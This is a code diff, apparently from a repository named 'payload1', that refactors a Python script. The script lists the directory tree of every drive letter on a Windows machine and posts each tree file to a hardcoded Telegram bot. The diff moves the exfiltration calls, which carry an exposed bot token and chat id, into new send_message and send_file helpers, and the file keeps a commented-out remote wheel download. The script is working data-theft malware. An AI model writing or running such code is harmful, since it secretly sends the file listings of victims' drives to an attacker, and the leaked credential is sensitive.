@@ -62,6 +62,21 @@ def download_and_install_whl(url, filename):
     except Exception as e:
         print(f"Error downloading or installing whl: {e}")
 
+def send_message(message):
+    chat_id = "-4102145810"
+    token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
+    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")
+
+def send_file(filepath):
+    chat_id = "-4102145810"
+    token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
+    data = {'chat_id' : chat_id}
+    with open(filepath, 'rb') as file:
+        files = {
+            'document': file.read()
+        }
+    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)
+
 def is_junction(path):
     if os.path.isdir(path) and not os.path.exists(path):
         return True
@@ -91,9 +106,8 @@ def tree(directory, file, prefix=''):
             connector = '├── ' if index < len(contents) - 1 else '└── '
             file.write(prefix + connector + name + '\n')
 
-def scan_usb():
+def tree_usb():
     maj_letters = list(string.ascii_uppercase)
-    data = {'chat_id' : '-4102145810'}
     for maj_letters in maj_letters:
         letterpath = str(maj_letters) + ":\\"
         if os.path.isdir(letterpath):
@@ -101,14 +115,10 @@ def scan_usb():
                 tree(letterpath, temp_file)
                 temp_file_path = temp_file.name
             print(f"{letterpath} : {temp_file_path}")
-            with open(temp_file_path, 'rb') as file:
-                files = {
-                    'document': file.read()
-                }
-            r = requests.post(f"https://api.telegram.org/bot6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA/sendMessage?chat_id=-4102145810&text={letterpath}")
-            r = requests.post("https://api.telegram.org/bot6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA/sendDocument", data=data, files=files)
+            send_message(letterpath)
+            send_file(temp_file_path)
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
-scan_usb()
+tree_usb()
